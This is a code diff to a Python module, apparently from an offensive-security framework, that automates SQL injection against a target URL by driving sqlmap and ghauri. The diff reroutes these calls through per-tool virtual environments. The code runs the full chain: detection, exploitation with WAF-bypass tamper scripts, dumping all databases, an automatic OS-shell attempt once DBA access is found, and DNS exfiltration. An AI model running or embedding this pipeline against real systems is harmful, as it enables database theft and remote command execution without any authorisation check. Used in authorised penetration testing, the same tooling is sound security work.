@@ -1,14 +1,40 @@
 from __future__ import annotations
 
 import subprocess
-from typing import Any
+from pathlib import Path
+from typing import Any, Optional
 
-from hackempire.core.models import Vulnerability, WafResult
-from hackempire.tools.waf.waf_bypass_strategy import WafBypassStrategy
+from core.models import Vulnerability, WafResult
+from tools.waf.waf_bypass_strategy import WafBypassStrategy
+
+# Tools that are pip-installed and must run inside their venv
+_VENV_TOOLS = {"sqlmap", "ghauri"}
+
+
+def _resolve_cmd(tool_name: str, args: list[str]) -> list[str]:
+    """
+    Build a subprocess command for *tool_name* using its isolated venv if available,
+    otherwise fall back to the system binary.
+
+    sqlmap and ghauri are pip-based — they must always run inside their venv
+    to avoid system-level dependency conflicts (PEP 668 / Kali externally-managed).
+    """
+    if tool_name in _VENV_TOOLS:
+        try:
+            from installer.tool_venv_manager import get_global_venv_manager
+            manager = get_global_venv_manager()
+            venv_python: Optional[Path] = manager.get_venv_python(tool_name)
+            if venv_python and venv_python.exists():
+                return [str(venv_python), "-m", tool_name] + args
+        except Exception:
+            pass
+    return [tool_name] + args
 
 
 class SQLiMethodology:
-    """Orchestrates SQL injection testing: detection, exploitation, enumeration, privilege escalation, OOB, and second-order."""
+    """Orchestrates SQL injection testing: detection, exploitation, enumeration,
+    privilege escalation, OOB, and second-order. All sqlmap/ghauri calls run
+    inside their isolated venvs."""
 
     def __init__(self) -> None:
         self._bypass = WafBypassStrategy()
@@ -18,7 +44,6 @@ class SQLiMethodology:
     # ------------------------------------------------------------------
 
     def detect(self, url: str, param: str) -> list[Vulnerability]:
-        """Fingerprint injection type using sqlmap and ghauri."""
         findings: list[Vulnerability] = []
         try:
             findings.extend(self._run_sqlmap_detect(url, param))
@@ -33,16 +58,13 @@ class SQLiMethodology:
     def _run_sqlmap_detect(self, url: str, param: str) -> list[Vulnerability]:
         findings: list[Vulnerability] = []
         try:
-            cmd = [
-                "sqlmap",
-                "-u", url,
-                "-p", param,
-                "--level=1",
-                "--risk=1",
-                "--batch",
+            args = [
+                "-u", url, "-p", param,
+                "--level=1", "--risk=1", "--batch",
                 "--technique=BEUSTQ",
                 "--output-dir=/tmp/sqlmap_detect",
             ]
+            cmd = _resolve_cmd("sqlmap", args)
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
             output = result.stdout + result.stderr
             if "is vulnerable" in output or "sqlmap identified" in output or "Parameter:" in output:
@@ -67,13 +89,8 @@ class SQLiMethodology:
     def _run_ghauri_detect(self, url: str, param: str) -> list[Vulnerability]:
         findings: list[Vulnerability] = []
         try:
-            cmd = [
-                "ghauri",
-                "-u", url,
-                "-p", param,
-                "--batch",
-                "--level=1",
-            ]
+            args = ["-u", url, "-p", param, "--batch", "--level=1"]
+            cmd = _resolve_cmd("ghauri", args)
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
             output = result.stdout + result.stderr
             if "is vulnerable" in output or "injectable" in output.lower() or "Parameter" in output:
@@ -100,21 +117,18 @@ class SQLiMethodology:
     # ------------------------------------------------------------------
 
     def exploit(self, url: str, param: str, technique: str, waf: WafResult | None) -> list[Vulnerability]:
-        """Run sqlmap with WAF tamper scripts from WafBypassStrategy."""
         findings: list[Vulnerability] = []
         try:
             tampers = self._bypass.get_sqlmap_tampers(waf.vendor if waf else None)
             tamper_str = ",".join(tampers) if tampers else ""
-            cmd = [
-                "sqlmap",
-                "-u", url,
-                "-p", param,
-                "--batch",
+            args = [
+                "-u", url, "-p", param, "--batch",
                 f"--technique={technique}",
                 "--output-dir=/tmp/sqlmap_exploit",
             ]
             if tamper_str:
-                cmd += ["--tamper", tamper_str]
+                args += ["--tamper", tamper_str]
+            cmd = _resolve_cmd("sqlmap", args)
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
             output = result.stdout + result.stderr
             if "is vulnerable" in output or "sqlmap identified" in output:
@@ -141,32 +155,23 @@ class SQLiMethodology:
     # ------------------------------------------------------------------
 
     def enumerate_db(self, url: str, param: str) -> list[Vulnerability]:
-        """Run sqlmap --dbs, --tables, --dump-all pipeline."""
         findings: list[Vulnerability] = []
-        try:
-            findings.extend(self._sqlmap_enum_step(url, param, ["--dbs"], "Database Enumeration via SQLi"))
-        except Exception:
-            pass
-        try:
-            findings.extend(self._sqlmap_enum_step(url, param, ["--tables"], "Table Enumeration via SQLi"))
-        except Exception:
-            pass
-        try:
-            findings.extend(self._sqlmap_enum_step(url, param, ["--dump-all", "--exclude-sysdbs"], "Data Dump via SQLi"))
-        except Exception:
-            pass
+        for extra, vuln_name in [
+            (["--dbs"], "Database Enumeration via SQLi"),
+            (["--tables"], "Table Enumeration via SQLi"),
+            (["--dump-all", "--exclude-sysdbs"], "Data Dump via SQLi"),
+        ]:
+            try:
+                findings.extend(self._sqlmap_enum_step(url, param, extra, vuln_name))
+            except Exception:
+                pass
         return findings
 
     def _sqlmap_enum_step(self, url: str, param: str, extra_flags: list[str], vuln_name: str) -> list[Vulnerability]:
         findings: list[Vulnerability] = []
         try:
-            cmd = [
-                "sqlmap",
-                "-u", url,
-                "-p", param,
-                "--batch",
-                "--output-dir=/tmp/sqlmap_enum",
-            ] + extra_flags
+            args = ["-u", url, "-p", param, "--batch", "--output-dir=/tmp/sqlmap_enum"] + extra_flags
+            cmd = _resolve_cmd("sqlmap", args)
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
             output = result.stdout + result.stderr
             if output.strip():
@@ -193,17 +198,10 @@ class SQLiMethodology:
     # ------------------------------------------------------------------
 
     def escalate_privileges(self, url: str, param: str) -> list[Vulnerability]:
-        """Check --is-dba; attempt --os-shell if DBA."""
         findings: list[Vulnerability] = []
         try:
-            cmd = [
-                "sqlmap",
-                "-u", url,
-                "-p", param,
-                "--batch",
-                "--is-dba",
-                "--output-dir=/tmp/sqlmap_privesc",
-            ]
+            args = ["-u", url, "-p", param, "--batch", "--is-dba", "--output-dir=/tmp/sqlmap_privesc"]
+            cmd = _resolve_cmd("sqlmap", args)
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
             output = result.stdout + result.stderr
             if "current user is DBA" in output:
@@ -221,16 +219,9 @@ class SQLiMethodology:
                         remediation="Restrict database user privileges; never run app DB user as DBA.",
                     )
                 )
-                # Attempt OS shell since user is DBA
                 try:
-                    os_cmd = [
-                        "sqlmap",
-                        "-u", url,
-                        "-p", param,
-                        "--batch",
-                        "--os-shell",
-                        "--output-dir=/tmp/sqlmap_osshell",
-                    ]
+                    os_args = ["-u", url, "-p", param, "--batch", "--os-shell", "--output-dir=/tmp/sqlmap_osshell"]
+                    os_cmd = _resolve_cmd("sqlmap", os_args)
                     os_result = subprocess.run(os_cmd, capture_output=True, text=True, timeout=120, shell=False)
                     os_output = os_result.stdout + os_result.stderr
                     if "os-shell" in os_output.lower() or "command standard output" in os_output.lower():
@@ -259,17 +250,10 @@ class SQLiMethodology:
     # ------------------------------------------------------------------
 
     def out_of_band(self, url: str, param: str, dns_domain: str) -> list[Vulnerability]:
-        """Run sqlmap --dns-domain exfiltration."""
         findings: list[Vulnerability] = []
         try:
-            cmd = [
-                "sqlmap",
-                "-u", url,
-                "-p", param,
-                "--batch",
-                f"--dns-domain={dns_domain}",
-                "--output-dir=/tmp/sqlmap_oob",
-            ]
+            args = ["-u", url, "-p", param, "--batch", f"--dns-domain={dns_domain}", "--output-dir=/tmp/sqlmap_oob"]
+            cmd = _resolve_cmd("sqlmap", args)
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
             output = result.stdout + result.stderr
             if dns_domain in output or "DNS" in output:
@@ -296,17 +280,14 @@ class SQLiMethodology:
     # ------------------------------------------------------------------
 
     def second_order(self, inject_url: str, trigger_url: str, param: str) -> list[Vulnerability]:
-        """Run sqlmap --second-url test."""
         findings: list[Vulnerability] = []
         try:
-            cmd = [
-                "sqlmap",
-                "-u", inject_url,
-                "-p", param,
-                "--batch",
+            args = [
+                "-u", inject_url, "-p", param, "--batch",
                 f"--second-url={trigger_url}",
                 "--output-dir=/tmp/sqlmap_secondorder",
             ]
+            cmd = _resolve_cmd("sqlmap", args)
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
             output = result.stdout + result.stderr
             if "is vulnerable" in output or "sqlmap identified" in output:
@@ -333,18 +314,15 @@ class SQLiMethodology:
     # ------------------------------------------------------------------
 
     def run(self, target: str, params: list[str], context: Any = None) -> list[Vulnerability]:
-        """Orchestrate detection, exploitation, and enumeration; return deduplicated findings."""
         waf: WafResult | None = None
         if context is not None and hasattr(context, "waf_result"):
             waf = context.waf_result
 
         all_findings: list[Vulnerability] = []
-
         for param in params:
             all_findings.extend(self.detect(target, param))
             all_findings.extend(self.exploit(target, param, "BEUSTQ", waf))
             all_findings.extend(self.enumerate_db(target, param))
-
         return self._deduplicate(all_findings)
 
     # ------------------------------------------------------------------
@@ -352,7 +330,6 @@ class SQLiMethodology:
     # ------------------------------------------------------------------
 
     def _deduplicate(self, findings: list[Vulnerability]) -> list[Vulnerability]:
-        """Remove duplicate Vulnerability objects (same name + url + severity)."""
         seen: dict[tuple[str, str, str], Vulnerability] = {}
         for vuln in findings:
             key = (vuln.name, vuln.url, vuln.severity)
